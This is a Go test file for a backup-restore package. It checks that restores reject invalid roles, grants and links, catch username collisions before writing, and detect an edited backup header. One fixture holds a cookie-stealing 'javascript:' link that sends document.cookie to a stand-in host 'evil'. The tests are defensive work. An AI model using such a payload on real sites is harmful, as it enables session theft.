package backup

import (
	"bytes"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/kordloom/switchtender/internal/credential"
	"github.com/kordloom/switchtender/internal/grant"
	"github.com/kordloom/switchtender/internal/user"
)

// TestCheckRefusesAFileTheAPIWouldRefuse verifies a restore applies the validation every other write
// path applies, before anything is written.
//
// Restore wrote straight to the stores. A file could set a role no check recognizes, a grant naming
// nothing, or a profile link carrying a script URL. The role and grant cases fail closed, so they
// lock an account out rather than let it in. The profile link does not: the users page renders it as
// an anchor, and the comment beside that code says it is safe because the server accepts only http
// and https. Restore was the path that did not.
func TestCheckRefusesAFileTheAPIWouldRefuse(t *testing.T) {
	t.Parallel()
	tests := []struct {
		Name    string
		Payload *payload
		WantErr string
	}{{ // Test 0: A script URL in a profile link, which the users page turns into a clickable anchor.
		Name: "script url in a profile link",
		Payload: &payload{Users: []userDTO{{User: user.User{
			ID: "usr_1", Username: "mallory", Role: user.RoleViewer,
			Links: []string{"javascript:fetch('//evil/'+document.cookie)"},
		}}}},
		WantErr: "usr_1",
	}, { // Test 1: A role nothing recognizes.
		Name: "unknown role",
		Payload: &payload{Users: []userDTO{{User: user.User{
			ID: "usr_2", Username: "mallory", Role: user.Role("superadmin"),
		}}}},
		WantErr: "not a role",
	}, { // Test 2: A grant whose subject is not a subject.
		Name: "grant subject",
		Payload: &payload{Grants: []*grant.Grant{{
			ID: "gr_1", Subject: "everyone", Object: "cred_1", Access: grant.AccessUse,
		}}},
		WantErr: "not one",
	}, { // Test 3: A grant whose access level does not exist.
		Name: "grant access",
		Payload: &payload{Grants: []*grant.Grant{{
			ID: "gr_2", Subject: "user_1", Object: "cred_1", Access: grant.Access("root"),
		}}},
		WantErr: "not an access level",
	}}
	for testNum, test := range tests {
		t.Run(test.Name, func(t *testing.T) {
			t.Parallel()
			err := check(t.Context(), freshStores(), test.Payload)
			if err == nil {
				t.Fatalf("test %d: a file the API would refuse was accepted for restore", testNum)
			}
			if !strings.Contains(err.Error(), test.WantErr) {
				t.Errorf("test %d: error = %v, want it to mention %q", testNum, err, test.WantErr)
			}
		})
	}
}

// TestCheckCatchesAUsernameCollisionBeforeWriting verifies the case that actually breaks a restore
// partway.
//
// Accounts are keyed by id and usernames are unique, so a backup holding a name the target already
// uses under a different id fails at the unique index. Users are written near the front, so by then
// orgs, teams, and earlier accounts are already committed, and the operator was shown an error and a
// summary of zero.
func TestCheckCatchesAUsernameCollisionBeforeWriting(t *testing.T) {
	t.Parallel()
	stores := freshStores()
	if err := stores.Users.Save(t.Context(), &user.User{
		ID: "usr_local", Username: "bob", Role: user.RoleViewer, CreatedAt: time.Now(),
	}); err != nil {
		t.Fatalf("Save() error = %v", err)
	}
	err := check(t.Context(), stores, &payload{Users: []userDTO{{User: user.User{
		ID: "usr_backup", Username: "bob", Role: user.RoleAdmin,
	}}}})
	if err == nil {
		t.Fatal("a colliding username was accepted, so the restore fails after writing accounts")
	}
	if !strings.Contains(err.Error(), "collide") {
		t.Errorf("error = %v, want it to explain the collision", err)
	}
	// The same account under the same id is a legitimate restore of itself.
	if err := check(t.Context(), stores, &payload{Users: []userDTO{{User: user.User{
		ID: "usr_local", Username: "bob", Role: user.RoleAdmin,
	}}}}); err != nil {
		t.Errorf("restoring an account over itself was refused: %v", err)
	}
}

// TestHeaderCannotBeEditedAroundTheSeal verifies the snapshot time an operator reads is the one the
// backup was actually taken at.
//
// The seal covers the payload and binds nothing to the header beside it, so the envelope's
// created_at was editable by anyone who could write to wherever backups are kept, with no key at
// all. Swap in an old file, edit the date to look current, and the restore succeeds: offboarded
// accounts and their password hashes come back, because a restore never deletes, and the one field
// the operator checks reads correct.
func TestHeaderCannotBeEditedAroundTheSeal(t *testing.T) {
	t.Parallel()
	sealer := credential.NewSealer("pass", "salt")
	var buf bytes.Buffer
	src := freshStores()
	if err := src.Users.Save(t.Context(), &user.User{
		ID: "usr_1", Username: "ada", Role: user.RoleAdmin, CreatedAt: testTime,
	}); err != nil {
		t.Fatalf("Save() error = %v", err)
	}
	if _, err := Write(t.Context(), src, sealer, &buf); err != nil {
		t.Fatalf("Write() error = %v", err)
	}

	var env map[string]any
	if err := json.Unmarshal(buf.Bytes(), &env); err != nil {
		t.Fatalf("Unmarshal() error = %v", err)
	}
	env["created_at"] = "1999-01-01T00:00:00Z"
	edited, err := json.Marshal(env)
	if err != nil {
		t.Fatalf("Marshal() error = %v", err)
	}

	dst := freshStores()
	sum, err := Read(t.Context(), dst, sealer, bytes.NewReader(edited))
	if err == nil {
		t.Fatalf("a backup whose header was edited restored cleanly, reporting it was taken at %s",
			sum.CreatedAt)
	}
	if !errors.Is(err, ErrFormat) {
		t.Errorf("error = %v, want ErrFormat", err)
	}
	// Nothing was written on the way to noticing.
	if got, lerr := dst.Users.List(t.Context()); lerr != nil {
		t.Fatalf("List() error = %v", lerr)
	} else if len(got) != 0 {
		t.Errorf("%d accounts were written by a refused restore", len(got))
	}
}
